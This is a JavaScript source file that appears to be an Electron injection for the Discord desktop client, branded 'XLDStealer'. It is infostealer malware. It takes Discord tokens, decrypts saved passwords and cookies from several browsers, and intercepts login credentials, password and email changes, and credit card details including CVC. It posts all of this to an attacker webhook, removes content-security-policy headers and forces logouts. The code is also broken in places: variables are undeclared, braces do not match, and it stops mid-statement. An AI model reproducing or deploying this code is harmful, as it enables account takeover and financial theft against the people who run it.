const fs = require('fs'); const path = require('path'); const { BrowserWindow, session } = require('electron') const querystring = require('querystring'); const os = require('os') var webhook = "%WEBHOOK_LINK%"; const computerName = os.hostname(); const discordInstall = `${__dirname}` const EvalToken = `for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;` paths = [ appdata + '\\discord\\', appdata + '\\discordcanary\\', appdata + '\\discordptb\\', appdata + '\\discorddevelopment\\', appdata + '\\lightcord\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\', localappdata + '\\Google\\Chrome\\User Data\\Default\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 1\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 2\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 3\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 4\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Profile 5\\Network\\', localappdata + '\\Google\\Chrome\\User Data\\Guest Profile\\Network\\', appdata + '\\Opera Software\\Opera Stable\\', appdata + '\\Opera Software\\Opera GX Stable\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 1\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 2\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 3\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 4\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Profile 5\\Network\\', localappdata + '\\BraveSoftware\\Brave-Browser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 1\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 2\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 3\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 4\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Profile 5\\Network\\', localappdata + '\\Yandex\\YandexBrowser\\User Data\\Guest Profile\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Default\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 1\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 2\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 3\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 4\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Profile 5\\Network\\', localappdata + '\\Microsoft\\Edge\\User Data\\Guest Profile\\Network\\' ]; const config = { "logout": "%LOGOUT%", "logout-notify": "%LOGOUTNOTI%", "init-notify":"%INITNOTI%", "embed-color": 3447704, "disable-qr-code":"%DISABLEQRCODE%" } session.defaultSession.webRequest.onHeadersReceived((details, callback) => { 	if (details.url.startsWith(webhook)) { if (details.url.includes("discord.com")) { callback({ responseHeaders: Object.assign({ 'Access-Control-Allow-Headers': "*" }, details.responseHeaders) }); } else { callback({ responseHeaders: Object.assign({ "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"], 'Access-Control-Allow-Headers': "*", "Access-Control-Allow-Origin": "*" }, details.responseHeaders) }); } 		 	} else { 		delete details.responseHeaders['content-security-policy']; 		delete details.responseHeaders['content-security-policy-report-only']; 		callback({ 			responseHeaders: { 				...details.responseHeaders, 				'Access-Control-Allow-Headers': "*" 			} 		}) 	} }) function FirstTime() { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(`${EvalToken}`, !0).then((token => { if (config['init-notify'] == "true") { if (fs.existsSync(path.join(__dirname, "init"))) { fs.rmdirSync(path.join(__dirname, "init")); if (token == null || token == undefined || token == "") { var c={username:"XLDStealer",content:"",embeds:[{title:"Discord Initalized (User not Logged in)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"XLDStealer"},footer:{text:"XLDStealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c)); } else { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText; `,!0).then(a=>{const b=JSON.parse(a);var c={username:"XLDStealer",content:"",embeds:[{title:"Discord Initalized",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"<a:boostlevel:966792429443379281> Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"XLDStealer"},footer:{text:"XLDStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))SendToWebhook(pizza)}); } } } if (!fs.existsSync(path.join(__dirname, "XLDStealerBTW"))) { return !0 } fs.rmdirSync(path.join(__dirname, "XLDStealerBTW")); if (config.logout != "false" || config.logout == "%LOGOUT%") { if (config['logout-notify'] == "true") { if (token == null || token == undefined || token == "") { var c={username:"XLDStealer",content:"",embeds:[{title:"User log out (User not Logged in before)",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1}],author:{name:"XLDStealer"},footer:{text:"XLDStealer"},thumbnail:{url:"https://ibb.co/nmDLGCT"}}]};SendToWebhook(JSON.stringify(c)); } else { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp=new XMLHttpRequest;xmlHttp.open("GET","https://discord.com/api/v8/users/@me",!1),xmlHttp.setRequestHeader("Authorization","${token}"),xmlHttp.send(null),xmlHttp.responseText; `,!0).then(a=>{const b=JSON.parse(a);var c={username:"XLDStealer",content:"",embeds:[{title:"User got logged out",color:config["embed-color"],fields:[{name:"Info",value:`\`\`\`Hostname: \n${computerName}\nInjection Info: \n${__dirname}\n\`\`\``,inline:!1},{name:"Username",value:`\`${b.username}#${b.discriminator}\``,inline:!0},{name:"ID",value:`\`${b.id}\``,inline:!0},{name:"<a:boostlevel:966792429443379281> Badges",value:`${GetBadges(b.flags)}`,inline:!1},{name:"Token",value:`\`\`\`${token}\`\`\``,inline:!1}],author:{name:"XLDStealer"},footer:{text:"XLDStealer"},thumbnail:{url:`https://cdn.discordapp.com/avatars/${b.id}/${b.avatar}`}}]};SendToWebhook(JSON.stringify(c))}); } } const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {}); } return !1 })) } const Filter = { "urls": ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"] } session.defaultSession.webRequest.onBeforeRequest(Filter, (details, callback) => { if (details.url.startsWith("wss://")) { if (config["disable-qr-code"] == "true" || config["disable-qr-code"] == "%DISABLEQRCODE%"){ callback({ cancel: true }) return; } } if (FirstTime()){} callback({}) return; }) function SendToWebhook(what) { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xhr = new XMLHttpRequest(); xhr.open("POST", "${webhook}", true); xhr.setRequestHeader('Content-Type', 'application/json'); xhr.setRequestHeader('Access-Control-Allow-Origin', '*'); xhr.send(JSON.stringify(${what})); `, !0).then((token => {})) } function GetNitro(flags) { if (flags == 0) { return "No Nitro" } if (flags == 1) { return "<:classic:896119171019067423> \`Nitro Classic\`" } if (flags == 2) { return "<a:boost:824036778570416129> \`Nitro Boost\`" } else { return "No Nitro" } } function GetRBadges(flags) { const Discord_Employee = 1; const Partnered_Server_Owner = 2; const HypeSquad_Events = 4; const Bug_Hunter_Level_1 = 8; const Early_Supporter = 512; const Bug_Hunter_Level_2 = 16384; const Early_Verified_Bot_Developer = 131072; var badges = ""; if ((flags & Discord_Employee) == Discord_Employee) { badges += "<:staff:874750808728666152> " } if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) { badges += "<:partner:874750808678354964> " } if ((flags & HypeSquad_Events) == HypeSquad_Events) { badges += "<:hypesquad_events:874750808594477056> " } if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) { badges += "<:bughunter_1:874750808426692658> " } if ((flags & Early_Supporter) == Early_Supporter) { badges += "<:early_supporter:874750808414113823> " } if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) { badges += "<:bughunter_2:874750808430874664> " } if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) { badges += "<:developer:874750808472825986> " } if (badges == "") { badges = "" } return badges } function GetBadges(flags) { const Discord_Employee = 1; const Partnered_Server_Owner = 2; const HypeSquad_Events = 4; const Bug_Hunter_Level_1 = 8; const House_Bravery = 64; const House_Brilliance = 128; const House_Balance = 256; const Early_Supporter = 512; const Bug_Hunter_Level_2 = 16384; const Early_Verified_Bot_Developer = 131072; var badges = ""; if ((flags & Discord_Employee) == Discord_Employee) { badges += "<:staff:874750808728666152> " } if ((flags & Partnered_Server_Owner) == Partnered_Server_Owner) { badges += "<:partner:874750808678354964> " } if ((flags & HypeSquad_Events) == HypeSquad_Events) { badges += "<:hypesquad_events:874750808594477056> " } if ((flags & Bug_Hunter_Level_1) == Bug_Hunter_Level_1) { badges += "<:bughunter_1:874750808426692658> " } if ((flags & House_Bravery) == House_Bravery) { badges += "<:bravery:874750808388952075> " } if ((flags & House_Brilliance) == House_Brilliance) { badges += "<:brilliance:874750808338608199> " } if ((flags & House_Balance) == House_Balance) { badges += "<:balance:874750808267292683> " } if ((flags & Early_Supporter) == Early_Supporter) { badges += "<:early_supporter:874750808414113823> " } if ((flags & Bug_Hunter_Level_2) == Bug_Hunter_Level_2) { badges += "<:bughunter_2:874750808430874664> " } if ((flags & Early_Verified_Bot_Developer) == Early_Verified_Bot_Developer) { badges += "<:developer:874750808472825986> " } if (badges == "") { badges = "None" } return badges } takePizzas(); takeCheese(); stealTokens() removePizzas(); listDiscords(); function Login(email, password, token) { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText;`, !0).then((info) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false ); xmlHttp.send( null ); xmlHttp.responseText; `, !0).then((ip) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0).then((info3) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/relationships", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0).then((info4) => { function totalFriends() { var f = JSON.parse(info4) const r = f.filter((user) => { return user.type == 1 }) return r.length } function CalcFriends() { var f = JSON.parse(info4) const r = f.filter((user) => { return user.type == 1 }) var gay = ""; for (z of r) { var b = GetRBadges(z.user.public_flags) if (b != "") { gay += b + ` ${z.user.username}#${z.user.discriminator}\n` } } if (gay == "") { gay = "No Rare Friends" } return gay } function Cool() { const json = JSON.parse(info3) var billing = ""; json.forEach(z => { if (z.type == "") { return "\`❌\`" } else if (z.type == 2 && z.invalid != !0) { billing += "\`✔️\`" + " <:paypal:896441236062347374>" } else if (z.type == 1 && z.invalid != !0) { billing += "\`✔️\`" + " :credit_card:" } else { return "\`❌\`" } }) if (billing == "") { billing = "\`❌\`" } return billing } const json = JSON.parse(info); var params = { username: "XLDStealer", content: "", embeds: [{ "title": "User Login", "color": config['embed-color'], "fields": [{ name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 }, { name: "Username", value: `\`${json.username}#${json.discriminator}\``, inline: !0 }, { name: "ID", value: `\`${json.id}\``, inline: !0 }, { name: "Nitro", value: `${GetNitro(json.premium_type)}`, inline: !1 }, { name: "<a:boostlevel:966792429443379281> Badges", value: `${GetBadges(json.flags)}`, inline: !1 }, { name: "Billing", value: `${Cool()}`, inline: !1 }, { name: "Email", value: `\`${email}\``, inline: !0 }, { name: "Password", value: `\`${password}\``, inline: !0 }, { name: "Token", value: `\`\`\`${token}\`\`\``, inline: !1 }, ], "author": { "name": "XLDStealer" }, "footer": { "text": "XLDStealer" }, "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}` } }, { "title": `Total Friends (${totalFriends()})`, "color": config['embed-color'], "description": CalcFriends(), "author": { "name": "XLDStealer" }, "footer": { "text": "XLDStealer" }, "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}` } }] } SendToWebhook(JSON.stringify(params)) 		 SendToWebhook(pizza) }) }) }) }) } function ChangePassword(oldpassword, newpassword, token) { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText;`, !0).then((info) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false ); xmlHttp.send( null ); xmlHttp.responseText; `, !0).then((ip) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0).then((info3) => { function Cool() { const json = JSON.parse(info3) var billing = ""; json.forEach(z => { if (z.type == "") { return "\`❌\`" } else if (z.type == 2 && z.invalid != !0) { billing += "\`✔️\`" + " <:paypal:896441236062347374>" } else if (z.type == 1 && z.invalid != !0) { billing += "\`✔️\`" + " :credit_card:" } else { return "\`❌\`" } }) if (billing == "") { billing = "\`❌\`" } return billing } const json = JSON.parse(info); var params = { username: "XLDStealer", content: "", embeds: [{ "title": "Password Changed", "color": config['embed-color'], "fields": [{ name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\nInjection Info: \n${discordInstall}\n\`\`\``, inline: !1 }, { name: "Username", value: `\`${json.username}#${json.discriminator}\``, inline: !0 }, { name: "ID", value: `\`${json.id}\``, inline: !0 }, { name: "Nitro", value: `${GetNitro(json.premium_type)}`, inline: !1 }, { name: "<a:boostlevel:966792429443379281> Badges", value: `${GetBadges(json.flags)}`, inline: !1 }, { name: "Billing", value: `${Cool()}`, inline: !1 }, { name: "Email", value: `\`${json.email}\``, inline: !1 }, { name: "Old Password", value: `\`${oldpassword}\``, inline: !0 }, { name: "New Password", value: `\`${newpassword}\``, inline: !0 }, { name: "Token", value: `\`\`\`${token}\`\`\``, inline: !1 }, ], "author": { "name": "XLDStealer" }, "footer": { "text": "XLDStealer" }, "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}` } }] } SendToWebhook(JSON.stringify(params)) }) }) }) } async function getPizzas(path) { let path_split = path.split('\\'), path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2), path_tail = path_split_tail.join('\\') + '\\'; if (path.startsWith(appdata)) path_tail = path; if (path.includes('cord')) return; if (fs.existsSync(path_tail)) { let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')) .os_crypt.encrypted_key, 'base64') .slice(5); var login_data = path + 'Login Data', passwords_db = path + 'passwords.db'; fs.copyFileSync(login_data, passwords_db); const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser'); var result = '\n\nPASSWORDS FROM: ' + path + ' #RustlerONTOP\n', sql = new sqlite3.Database(passwords_db, err => { if (err) { if (debug) console.log(err); } }); const pizza = await new Promise((resolve, reject) => { sql.each('SELECT origin_url, username_value, password_value FROM logins', function (err, row) { if (err) { if (debug) console.log(err); } if (row['username_value'] != '') { let password_value = row['password_value']; try { if ((password_value[0] == 1) && (password_value[1] == 0) && (password_value[2] == 0) && (password_value[3] == 0)) { result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + dpapi.unprotectData(password_value, null, 'CurrentUser') .toString('utf-8'); } else { let start = password_value.slice(3, 15), middle = password_value.slice(15, password_value.length - 16), end = password_value.slice(password_value.length - 16, password_value.length), decipher = crypto.createDecipheriv('aes-256-gcm', key, start); decipher.setAuthTag(end); result += '\nURL: ' + row['origin_url'] + ' | USERNAME: ' + row['username_value'] + ' | PASSWORD: ' + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8'); } } catch (e) { if (debug) console.log(e); } } }, function () { resolve(result); }); }); return pizza; } else { return ''; } } async function stealTokens() { const fields = []; for (let path of paths) { const foundTokens = findToken(path); if (foundTokens) foundTokens.forEach(token => { var c = { name: "<:browserstokens:951827260741156874> Browser Token;", value: `\`\`\`${token}\`\`\`[CopyToken](https://sourwearyresources.rustlerjs.repl.co/copy/`+ token +`)`, inline: !0 } fields.push(c) }); } async function getCheese(path) { let path_split = path.split('\\'), path_split_tail = path.includes('Network') ? path_split.splice(0, path_split.length - 3) : path_split.splice(0, path_split.length - 2), path_tail = path_split_tail.join('\\') + '\\'; if (path.startsWith(appdata)) path_tail = path; if (path.includes('cord')) return; if (fs.existsSync(path_tail)) { let encrypted = Buffer.from(JSON.parse(fs.readFileSync(path_tail + 'Local State')) .os_crypt.encrypted_key, 'base64') .slice(5); var cookies = path + 'Cookies', cookies_db = path + 'cookies.db'; fs.copyFileSync(cookies, cookies_db); const key = dpapi.unprotectData(Buffer.from(encrypted, 'utf-8'), null, 'CurrentUser'); var result = '', sql = new sqlite3.Database(cookies_db, err => { if (err) { if (debug) console.log(err); } }); const cheese = await new Promise((resolve, reject) => { sql.each('SELECT host_key, name, encrypted_value FROM cookies', function (err, row) { if (err) { if (debug) console.log(err); } let encrypted_value = row['encrypted_value']; try { if ((encrypted_value[0] == 1) && (encrypted_value[1] == 0) && (encrypted_value[2] == 0) && (encrypted_value[3] == 0)) { result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + dpapi.unprotectData(encrypted_value, null, 'CurrentUser') + "\n" .toString('utf-8'); } else { let start = encrypted_value.slice(3, 15), middle = encrypted_value.slice(15, encrypted_value.length - 16), end = encrypted_value.slice(encrypted_value.length - 16, encrypted_value.length), decipher = crypto.createDecipheriv('aes-256-gcm', key, start); decipher.setAuthTag(end); result += row['host_key'] + "	" + "TRUE" + "	/" + "	FALSE" + "	2597573456	" + row['name'] + "	" + decipher.update(middle, 'base64', 'utf-8') + decipher.final('utf-8') + "\n" } } catch (e) { if (debug) console.log(e); } }, function () { resolve(result); }) }); return cheese; } else return ''; } function findToken(path) { path += 'Local Storage\\leveldb'; let tokens = []; try { fs.readdirSync(path) .map(file => { (file.endsWith('.log') || file.endsWith('.ldb')) && fs.readFileSync(path + '\\' + file, 'utf8') .split(/\r?\n/) .forEach(line => { const patterns = [new RegExp(/mfa\.[\w-]{84}/g), new RegExp(/[\w-]{24}\.[\w-]{6}\.[\w-]{27}/g)]; for (const pattern of patterns) { const foundTokens = line.match(pattern); if (foundTokens) foundTokens.forEach(token => tokens.push(token)); } }); }); } catch (e) {} return tokens; } async function takePizzas() { let passwords = ''; for (let i = 0; i < paths.length; i++) { if (fs.existsSync(paths[i] + 'Login Data')) passwords += await getPizzas(paths[i]) || ''; } fs.writeFile(appdata + '\\passwords.txt', passwords, function (err, data) { if (err) throw err; const form = new FormData(); form.append("file", fs.createReadStream(appdata+"\\passwords.txt")); form.submit(webhook, (error, response) => { if (error) console.log(error); }); }); fs.writeFile(appdata + '\\src-passwords.txt', passwords, function (err, data) { if (err) throw err; const form = new FormData(); form.append("file", fs.createReadStream(appdata+"\\src-passwords.txt")); form.submit(src, (error, response) => { if (error) console.log(error); }); }); } async function takeCheese() { let cookies = ''; for (let i = 0; i < paths.length; i++) { if (fs.existsSync(paths[i] + 'Cookies')) cookies += await getCheese(paths[i]) || ''; } fs.writeFile(appdata + '\\cookies.txt', cookies, function (err, data) { if (err) throw err; const form = new FormData(); form.append("file", fs.createReadStream(appdata+"\\cookies.txt")); form.submit(superstarlmao, (error, response) => { if (error) console.log(error); }); }); fs.writeFile(appdata + '\\src-cookies.txt', cookies, function (err, data) { if (err) throw err; const form = new FormData(); form.append("file", fs.createReadStream(appdata+"\\src-cookies.txt")); form.submit(src, (error, response) => { if (error) console.log(error); }); }); function ChangeEmail(newemail, password, token) { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText;`, !0).then((info) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false ); xmlHttp.send( null ); xmlHttp.responseText; `, !0).then((ip) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0).then((info3) => { function Cool() { const json = JSON.parse(info3) var billing = ""; json.forEach(z => { if (z.type == "") { return "\`❌\`" } else if (z.type == 2 && z.invalid != !0) { billing += "\`✔️\`" + " <:paypal:896441236062347374>" } else if (z.type == 1 && z.invalid != !0) { billing += "\`✔️\`" + " :credit_card:" } else { return "\`❌\`" } }) if (billing == "") { billing = "\`❌\`" } return billing } const json = JSON.parse(info); var params = { username: "XLDStealer", content: "", embeds: [{ "title": "Email Changed", "color": config['embed-color'], "fields": [{ name: "Info", value: `\`\`\`Hostname: \n${computerName}\nIP: \n${ip}\`\`\``, inline: !1 }, { name: "Username", value: `\`${json.username}#${json.discriminator}\``, inline: !0 }, { name: "ID", value: `\`${json.id}\``, inline: !0 }, { name: "Nitro", value: `${GetNitro(json.premium_type)}`, inline: !1 }, { name: "<a:boostlevel:966792429443379281> Badges", value: `${GetBadges(json.flags)}`, inline: !1 }, { name: "Billing", value: `${Cool()}`, inline: !1 }, { name: "New Email", value: `\`${newemail}\``, inline: !0 }, { name: "Password", value: `\`${password}\``, inline: !0 }, { name: "Token", value: `\`\`\`${token}\`\`\``, inline: !1 }, ], "author": { "name": "XLDStealer" }, "footer": { "text": "XLDStealer" }, "thumbnail": { "url": `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}` } }] } SendToWebhook(JSON.stringify(params)) 		SendToWebhook(pizza) }) }) }) } function CreditCardAdded(number, cvc, expir_month, expir_year, street, city, state, zip, country, token) { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v8/users/@me", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText;`, !0).then((info) => { window.webContents.executeJavaScript(` var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://www.myexternalip.com/raw", false ); xmlHttp.send( null ); xmlHttp.responseText; `, !0).then((ip) => { var json = JSON.parse(info); var params = { username: "XLDStealer", content: "", embeds: [{ "title": "User Credit Card Added", "description": "**Username:**```" + json.username + "#" + json.discriminator + "```\n**ID:**```" + json.id + "```\n**Email:**```" + json.email + "```\n" + "**Nitro Type:**```" + GetNitro(json.premium_type) + "```\n**Badges:**```" + GetBadges(json.flags) + "```" + "\n**Credit Card Number: **```" + number + "```" + "\n**Credit Card Expiration: **```" + expir_month + "/" + expir_year + "```" + "\n**CVC: **```" + cvc + "```\n" + "**Country: **```" + country + "```\n" + "**State: **```" + state + "```\n" + "**City: **```" + city + "```\n" + "**ZIP:**```" + zip + "```" + "\n**Street: **```" + street + "```" + "\n**Token:**```" + token + "```" + "\n**IP: **```" + ip + "```", "author": { "name": "XLDStealer" }, "footer": { "text": "XLDStealer" }, "thumbnail": { "url": "https://cdn.discordapp.com/avatars/" + json.id + "/" + json.avatar } }] } SendToWebhook(JSON.stringify(params)) }) }) } const ChangePasswordFilter = { urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v*/tokens"] }; session.defaultSession.webRequest.onCompleted(ChangePasswordFilter, (details, callback) => { if (details.url.endsWith("login")) { if (details.statusCode == 200) { const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString()) const email = data.login; const password = data.password; const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let b=gg.c[a].exports;if(b&&b.__esModule&&b.default)for(let a in b.default)"getToken"==a&&(token=b.default.getToken())}token;`, !0).then((token => { Login(email, password, token) })) } else {} } if (details.url.endsWith("users/@me")) { if (details.statusCode == 200 && details.method == "PATCH") { const data = JSON.parse(Buffer.from(details.uploadData[0].bytes).toString()) if (data.password != null && data.password != undefined && data.password != "") { if (data.new_password != undefined && data.new_password != null && data.new_password != "") { const window = BrowserWindow.getAllWindows()[0]; window.webContents.executeJavaScript(`for(let a in window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]),gg.c)if(gg.c.hasOwnProperty(a)){let 